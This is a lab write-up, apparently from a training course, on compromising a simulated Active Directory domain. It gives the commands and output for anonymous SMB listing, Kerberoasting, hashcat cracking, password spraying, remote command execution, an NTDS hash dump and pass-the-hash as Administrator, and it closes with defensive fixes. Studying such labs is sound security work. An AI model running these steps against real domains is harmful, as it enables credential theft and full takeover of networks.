---
layout: post
title: "Active Directory Domain Compromise: From Valid Credentials to Full Domain Takeover"
date: 2026-07-21 23:50:00 +0400
---

## Introduction

This lab is from [HackSmarter](https://www.hacksmarter.org/courses/8da0b008-7692-4c3f-a861-b7a02a536e7b/take), and it's a simulation of something I think about a lot in this field: how much damage a single overlooked detail can do in the wrong environment. I didn't start with any credentials at all. I started with one IP address, and everything from there had to be earned.

By the end, a note left on an anonymously accessible file share had led me to full control of the domain: every password hash in Active Directory, the keys to forge Kerberos tickets at will, and Administrator access on the Domain Controller itself. Here's how it happened.

**Domain:** `DRY.MARTINI.BARS` · **DC:** `DC01` (`10.1.221.180`)

---

## Getting my bearings

The first thing I do in any engagement, real or simulated, is figure out what I'm actually looking at before I touch anything else. I had one IP address, `10.1.221.180`, so I started with a full port scan to see what the machine was actually running.

```bash
nmap -sC -sV -oN nmap_scan.txt 10.1.221.180
```

```
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-21 19:09:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The port list read like a checklist for a Domain Controller: Kerberos on 88, LDAP on 389 and 3268, SMB on 445, RDP on 3389. The LDAP service banner even confirmed the domain name outright, `DRY.MARTINI.BARS`, and an SSL certificate on the box named the host itself: `DC01.DRY.MARTINI.BARS`. There was no ambiguity left. This was the domain's Domain Controller.

![Nmap scan revealing Domain Controller ports on 10.1.221.180](/assets/images/img1-1.png)

With no credentials yet, the next move was to see whether anything was reachable without them.

## Finding the note nobody was supposed to leave behind

SMB shares are one of the first things worth checking anonymously, since misconfigured domains often leave more open than they realize.

```bash
smbclient -L //10.1.221.180 -N
```

One share stood out immediately: `notes`. Nothing about the name suggested it was sensitive, which is exactly why it was worth checking.

![Anonymous SMB share listing showing the notes share](/assets/images/img1-2.png)

```bash
smbclient //10.1.221.180/notes -N
```

Inside, a single file: `notes.txt`.

```bash
!cat notes.txt
```

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint
creds
mprice:*martini*
```

Buried under a to-do list was exactly what I was looking for: a username and password, sitting in plaintext on an anonymously readable share.

![Contents of notes.txt showing mprice credentials](/assets/images/img1-3.png)

## Turning a note into a foothold

Found credentials mean nothing until they're validated.

```bash
nxc smb 10.1.221.180 -u mprice -p '*martini*'
```

```
DRY.MARTINI.BARS\mprice:*martini*
```

The credentials worked. I now had a real, authenticated foothold in the domain.

![Validating mprice credentials against SMB](/assets/images/img1-4.png)

With a working account, I checked what it actually gave me access to.

```bash
nxc smb 10.1.221.180 -u mprice -p '*martini*' --shares
```

```
notes      READ,WRITE
SYSVOL     READ
NETLOGON   READ
```

`mprice` had write access back to the same share the note came from, plus standard read access to `SYSVOL` and `NETLOGON`. Nothing privileged yet, but enough to keep digging.

![Shares enumerated using mprice credentials](/assets/images/img1-5.png)

## Mapping the domain

With an authenticated account, LDAP and SMB enumeration open up considerably. I pulled the full list of domain users.

```bash
nxc smb 10.1.221.180 -u mprice -p '*martini*' --users
```

Found: `Administrator`, `Guest`, `krbtgt`, `mprice`, `athena.t0`, and `ATHENA_SVC`.

![Domain user list enumerated with mprice credentials](/assets/images/img1.png)

Next, the machines that made up the domain.

```bash
nxc ldap 10.1.221.180 -u mprice -p '*martini*' --query "(objectClass=computer)" ""
```

Two machines came back: `DC01` and `EVILPC`. `DC01` was already confirmed as the Domain Controller from the nmap scan.

![Domain computer objects DC01 and EVILPC](/assets/images/img2.png)

![Domain computer objects DC01 and EVILPC](/assets/images/img2-1.png)

I also confirmed LDAP was queryable at all despite signing being enforced on the server, since that would matter later if I wanted to use tooling like BloodHound.

```bash
nxc ldap 10.1.221.180 -u mprice -p '*martini*' --groups
```

![LDAP group enumeration confirming access with mprice](/assets/images/img3.png)

## The account that shouldn't have had an SPN

One of the accounts on that user list, `ATHENA_SVC`, was clearly a service account by its naming convention. Service accounts with Service Principal Names are a classic weak point in Active Directory, since anyone with a domain account can request a Kerberos ticket for them and attempt to crack it offline. Worth checking.

```bash
nxc ldap 10.1.221.180 -u mprice -p '*martini*' --kerberoasting kerb.txt
```

It came back with a ticket.

```
ATHENA_SVC

$krb5tgs$23$*ATHENA_SVC$...
```

`ATHENA_SVC` had an SPN registered, and I now had its Kerberos ticket saved to `kerb.txt`, ready for offline cracking.

![Kerberoasting hit returning a TGS hash for ATHENA_SVC](/assets/images/img3-1.png)

## Cracking the ticket

With the hash saved, I moved to hashcat.

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

The ticket cracked cleanly against `rockyou.txt`, revealing the plaintext password: `1dirtymartini`.

![Hashcat cracking the kerberoasted ticket to reveal the password](/assets/images/img3-2.png)

## The mistake that broke the case open

I tried the cracked password against the account it belonged to first.

```bash
nxc smb 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini'
```

Valid. `ATHENA_SVC` was now mine too.

![Validating the cracked password against ATHENA_SVC](/assets/images/img4.png)

But a cracked password is worth testing more broadly, since password reuse is one of the most common mistakes in real environments. I built a small user list and sprayed `1dirtymartini` across the domain.

```bash
crackmapexec smb 10.1.221.0/24 -u users.txt -d DRY.MARTINI.BARS -p '1dirtymartini'
```

```
DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```

`athena.t0` was using the exact same password as the service account. And as I was about to find out, this wasn't just another user login, `athena.t0` had administrative rights on the Domain Controller. A cracked service account ticket had just led me straight to a privileged human account.

![Password spray hit showing athena.t0 Pwn3d](/assets/images/img4-1.png)

## Confirming how far this actually went

Finding a hit is one thing. Proving what it actually gets you is another, so I checked exactly what `athena.t0` had access to.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --shares
```

```
ADMIN$   READ,WRITE
C$       READ,WRITE
```

Full read/write on `ADMIN$` and `C$` is about as clear a signal as it gets. This wasn't a limited user account that happened to reuse a password, it was a fully privileged one.

![Admin shares ADMIN and C with read write access](/assets/images/img5.png)

To remove any doubt, I ran a command directly on the Domain Controller.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' -x "whoami"
```

```
dry\athena.t0
```

That was the moment the engagement shifted. This wasn't enumeration anymore, the Domain Controller was compromised, and I had administrative code execution on it.

![Whoami output confirming execution as athena.t0](/assets/images/img6.png)

## Taking everything the domain had

With that level of access, there was really only one next move: pull the entire Active Directory password database and see exactly what I was dealing with.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --ntds
```

Every account in the domain came back with its hash: `Administrator`, `krbtgt`, `mprice`, `athena.t0`, `ATHENA_SVC`, `DC01$`, `EVILPC$`. At this point I had, in one file, everything an attacker would need to move freely through this environment.

![NTDS dump showing full account list and hashes](/assets/images/img7.png)

One entry mattered more than the rest: `krbtgt`, hash `22ebc290e67668629c8d0812662a9c51`. This is the account Kerberos itself relies on, and owning its hash means being able to forge valid authentication tickets on demand. It's the difference between a compromise you can clean up by resetting a few passwords, and one that persists no matter what the defenders do afterward, unless they specifically know to rotate this account too.

## Proving it beyond doubt

I had hashes. The question was whether I actually needed the plaintext passwords behind them, and the answer, as usual with Windows authentication, was no.

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS
```

```
DRY.MARTINI.BARS\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
```

No password. No cracking. Just the hash itself, straight from the NTDS dump, authenticating as the domain's most privileged account.

![Pass the hash authentication as Administrator Pwn3d](/assets/images/img8.png)

And to close the loop, I confirmed it the same way I had before:

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS -x "whoami"
```

```
dry\administrator
```

![Whoami output confirming execution as domain administrator](/assets/images/img9.png)

Starting from a single anonymous file share, the domain was now completely mine.

---

## The path it took

```
Anonymous SMB → notes.txt → mprice creds → domain enumeration
→ ATHENA_SVC kerberoastable → cracked ticket → password reuse
→ athena.t0 admin → NTDS dump → KRBTGT exposed → Pass-the-Hash → Administrator
```

Every step here followed logically from the last. Nothing about this required a zero-day or a clever exploit, it required patience, a methodical process, and paying attention to the small mistakes that real environments make all the time: a note left where it shouldn't have been, a service account that didn't need an SPN, and a password reused one time too many.

## What didn't work

Not every avenue paid off, and I think that's worth including rather than leaving out.

**BloodHound collection was refused later in the engagement.** The Domain Controller had LDAP signing enforced, which blocks the kind of unsigned collection BloodHound relies on by default. A good reminder that some of the "standard" tooling in this field assumes a level of misconfiguration that isn't always there.

**Direct SMB access using just the hash failed at first.** `smbclient` expects a plaintext password by default, not an NT hash, so a hash-aware tool was needed instead. Small thing, but it's the kind of detail that trips people up if they assume every tool handles authentication the same way.

## Why this mattered

None of this was the result of a sophisticated attack. It was the result of ordinary, common mistakes: credentials left in plaintext on an anonymously accessible share, a service account with an unnecessary SPN, and a password reused between that service account and a privileged user. Put those together, and a single anonymous file share is enough to walk away with the entire domain.

## What I'd recommend fixing

- Never store credentials in plaintext files on any share, especially ones reachable anonymously
- Restrict or disable anonymous SMB access entirely where it isn't required
- Only assign SPNs to service accounts that genuinely need them, and use long, randomized passwords for the ones that do
- Enforce unique passwords across every account, service and human alike
- Apply least privilege consistently, no account should hold more rights than its role requires
- Watch for abnormal SMB authentication patterns, especially spray-style attempts across a subnet
- Move service accounts to gMSA instead of static, human-managed passwords
- Require MFA on privileged accounts wherever the environment allows it
- Audit Active Directory permissions and group memberships on a regular schedule, not just after an incident
